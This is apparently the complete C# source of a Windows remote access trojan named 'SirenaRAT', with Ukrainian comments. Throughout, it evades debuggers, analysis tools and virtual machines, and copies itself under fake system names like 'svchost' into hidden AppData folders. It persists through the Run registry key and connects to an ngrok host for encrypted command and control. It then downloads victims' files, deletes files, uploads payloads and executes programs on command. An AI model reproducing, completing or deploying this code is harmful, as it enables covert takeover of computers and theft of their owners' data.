using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace SirenaClient
{
    internal class Program
    {
        private const string Host = "0.tcp.ngrok.io";
        private const int Port = 1337;

        private static readonly string MutexName = "SirenaRAT_69_420";
        private static readonly Random Rnd = new Random();
        private static string TargetPath = "";
        private static TcpClient client;
        private static NetworkStream stream;
        private static Aes aes = Aes.Create();

        static void Main()
        {
            if (!InitAntiAnalysis()) return;
            if (!CreateMutex()) return;

            Thread.Sleep(Rnd.Next(30000, 120000)); // рандомна затримка

            GenerateRandomPath();
            HideConsole();
            CopyToAppDataAndRestart();
            HideFile();
            AddToStartup();

            _ = Task.Run(ConnectLoop);
            Thread.Sleep(Timeout.Infinite);
        }

        #region Anti-everything
        static bool InitAntiAnalysis()
        {
            if (IsDebuggerPresent() || Debugger.IsAttached) Environment.Exit(0);

            string[] badProcs = { "fiddler", "wireshark", "procmon", "procexp", "vmware", "vbox", "sandboxie" };
            if (Process.GetProcesses().Any(p => badProcs.Any(b => p.ProcessName.ToLower().Contains(b))))
                Environment.Exit(0);

            if (IsVirtualMachine()) Environment.Exit(0);

            return true;
        }

        static bool IsVirtualMachine()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
            {
                foreach (var obj in searcher.Get())
                    if (obj["Manufacturer"]?.ToString().ToLower().Contains("vmware") == true ||
                        obj["Manufacturer"]?.ToString().ToLower().Contains("virtual") == true ||
                        obj["Model"]?.ToString().ToLower().Contains("virtual") == true)
                        return true;
            }
            return false;
        }

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        static bool CreateMutex()
        {
            bool created;
            new Mutex(true, MutexName, out created);
            return created;
        }
        #endregion

        static void GenerateRandomPath()
        {
            string[] names = { "svchost", "WindowsUpdate", "TaskHost", "OneDriveSync", "SecurityHealth", "Updater" };
            string[] dirs = { "Microsoft\\Windows", "Microsoft\\EdgeUpdate", "Google\\Update", "Mozilla\\Maintenance" };
            TargetPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                dirs[Rnd.Next(dirs.Length)],
                names[Rnd.Next(names.Length)] + Rnd.Next(1000, 9999) + ".exe");
        }

        static async Task ConnectLoop()
        {
            while (true)
            {
                try
                {
                    client = new TcpClient();
                    await client.ConnectAsync(Host, Port);
                    stream = client.GetStream();

                    // Обмін ключами AES
                    await ExchangeKey();

                    _ = Task.Run(Heartbeat);

                    byte[] buf = new byte[131072];
                    while (client.Connected)
                    {
                        int read = await stream.ReadAsync(buf, 0, buf.Length);
                        if (read <= 0) break;

                        string encrypted = Encoding.UTF8.GetString(buf, 0, read);
                        string cmd = Decrypt(encrypted);
                        if (string.IsNullOrEmpty(cmd)) continue;

                        string resp = Execute(cmd);
                        await stream.WriteAsync(Encrypt(resp));
                    }
                }
                catch { }
                finally
                {
                    stream?.Close();
                    client?.Close();
                }
                await Task.Delay(7000 + Rnd.Next(0, 8000));
            }
        }

        static async Task ExchangeKey()
        {
            aes.KeySize = 256;
            aes.GenerateKey();
            aes.GenerateIV();

            byte[] key = aes.Key;
            byte[] iv = aes.IV;

            byte[] payload = new byte[4 + key.Length + iv.Length];
            BitConverter.GetBytes(key.Length).CopyTo(payload, 0);
            key.CopyTo(payload, 4);
            iv.CopyTo(payload, 4 + key.Length);

            await stream.WriteAsync(payload, 0, payload.Length);
        }

        static byte[] Encrypt(string plain) => Encrypt(Encoding.UTF8.GetBytes(plain + "\n"));
        static byte[] Encrypt(byte[] data)
        {
            using var ms = new MemoryStream();
            using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                cs.Write(data, 0, data.Length);
            return ms.ToArray();
        }

        static string Decrypt(string b64)
        {
            try
            {
                byte[] data = Convert.FromBase64String(b64);
                using var ms = new MemoryStream(data);
                using var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
                using var sr = new StreamReader(cs, Encoding.UTF8);
                return sr.ReadToEnd().Trim();
            }
            catch { return ""; }
        }

        static string Execute(string cmd)
        {
            try
            {
                // === Файловий менеджер ===
                if (cmd == "ls" || cmd == "dir")
                    return string.Join("|||", Directory.GetFiles(Directory.GetCurrentDirectory()).Select(Path.GetFileName)) + "|||" +
                           string.Join("|||", Directory.GetDirectories(Directory.GetCurrentDirectory()).Select(Path.GetFileName));

                if (cmd.StartsWith("cd "))
                {
                    string path = cmd.Substring(3).Trim('"');
                    if (path == "..") Directory.SetCurrentDirectory("..");
                    else if (Directory.Exists(path)) Directory.SetCurrentDirectory(path);
                    return "cd ok: " + Directory.GetCurrentDirectory();
                }

                if (cmd.StartsWith("download:"))
                {
                    string path = cmd.Substring(9).Trim();
                    if (File.Exists(path))
                    {
                        byte[] file = File.ReadAllBytes(path);
                        return "FILE|" + Path.GetFileName(path) + "|" + Convert.ToBase64String(file);
                    }
                    return "file not found";
                }

                if (cmd.StartsWith("delete:"))
                {
                    string path = cmd.Substring(7).Trim();
                    File.Delete(path);
                    return "deleted";
                }

                if (cmd.StartsWith("rename:"))
                {
                    var parts = cmd.Substring(7).Split(' ');
                    File.Move(parts[0], parts[1]);
                    return "renamed";
                }

                // === Старі команди ===
                if (cmd.StartsWith("exec:")) { Process.Start(cmd.Substring(5).Trim()); return "executed"; }
                if (cmd.StartsWith("upload:"))
                {
                    string path = cmd.Substring(7).Trim();
                    using var fs = new FileStream(path, FileMode.Create);
                    byte[] fb = new byte[1048576];
                    int b;
                    while ((b = stream.Read(fb, 0, fb.Length)) > 0)
                    {
                        fs.Write(fb, 0, b);
                        if (b < fb.Length) break;
                    }
                    return "uploaded";
                }

                if (cmd == "getinfo")
                {
                    var p = Process.GetProcesses();
                    string procs = string.Join(", ", p.Where(x => !string.IsNullOrEmpty(x.MainWindowTitle)).Take(6).Select(x => x.ProcessName));
                    return $"PC: {Environment.MachineName} | User: {Environment.UserName} | Procs: {procs} | Path: {Directory.GetCurrentDirectory()}";
                }
            }
            catch (Exception ex) { return "error: " + ex.Message; }

            return "ok";
        }

        static async Task Heartbeat()
        {
            while (client?.Connected == true)
            {
                await Task.Delay(15000);
                if (stream?.CanWrite == true)
                    try { await stream.WriteAsync(Encrypt("getinfo")); }
                    catch { break; }
            }
        }

        static void CopyToAppDataAndRestart()
        {
            string current = Process.GetCurrentProcess().MainModule.FileName;
            if (current.Equals(TargetPath, StringComparison.OrdinalIgnoreCase)) return;

            Directory.CreateDirectory(Path.GetDirectoryName(TargetPath));
            File.Copy(current, TargetPath, true);
            File.SetAttributes(TargetPath, FileAttributes.Hidden | FileAttributes.System);

            Process.Start(new ProcessStartInfo
            {
                FileName = TargetPath,
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });

            Environment.Exit(0);
        }

        static void HideFile()
        {
            try { if (File.Exists(TargetPath)) File.SetAttributes(TargetPath, FileAttributes.Hidden | FileAttributes.System); }
            catch { }
        }

        static void AddToStartup()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key?.SetValue("WindowsService", $"\"{TargetPath}\"");
            }
            catch { }
        }

        static void HideConsole()
        {
            try { Console.WindowHeight = 1; Console.Title = ""; } catch { }
        }
    }
}